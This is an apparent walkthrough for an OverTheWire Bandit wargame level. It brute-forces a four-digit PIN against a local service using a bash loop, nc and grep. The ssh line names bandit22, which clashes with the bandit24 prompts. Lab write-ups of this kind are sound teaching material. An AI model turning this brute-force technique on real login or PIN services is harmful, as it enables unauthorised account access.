To connect, `ssh bandit22@bandit.labs.overthewire.org -p 2220`.

On being prompted for a password, enter the password found from the previous level.

After a successful connection, we are presented with a shell.



We are told that we need to send the current level's password and a four digit pincode separated by a space to a service listening on port 30002.

If the password and the pincode are correct, the service will return the password for the next level.


But we don't know the pincode. So we will need to try all possible pincodes from 0000 to 9999.

This is also known as bruteforcing.


To do so, we are first going to generate all possible pincodes, concatenate it with the password and store it in a file.

```
bandit24@bandit:~$ for pincode in {0000..9999}; do echo "<bandit24_password> $pincode"; done > /tmp/<file_name>
```

We run a for loop from 0000 to 9999, concatenate the current level's password with the pincode separated by a space and then store all the combinations in a file.


Before we run the bruteforce, lets try 0000 as pincode to see what response is received if the wrong pincode is sent to the service.

```
bandit24@bandit:~$ echo "<bandit24_password> 0000" | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password. Try again.
^C
bandit24@bandit:~$
```


Now when we run the bruteforce, we know what response we will receive if the wrong pincode is sent.

So we will filter for response which will not contain the word **Wrong** using grep.

The -v switch tells grep to match those inputs where the pattern does not occur.

```
bandit24@bandit:~$ cat /tmp/<file_name> | nc localhost 30002 | grep -v "Wrong"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is <bandit25_password>

Exiting.
bandit24@bandit:~$
```


Be sure to remove the file before closing the connection.


With this we will get the password for the next level.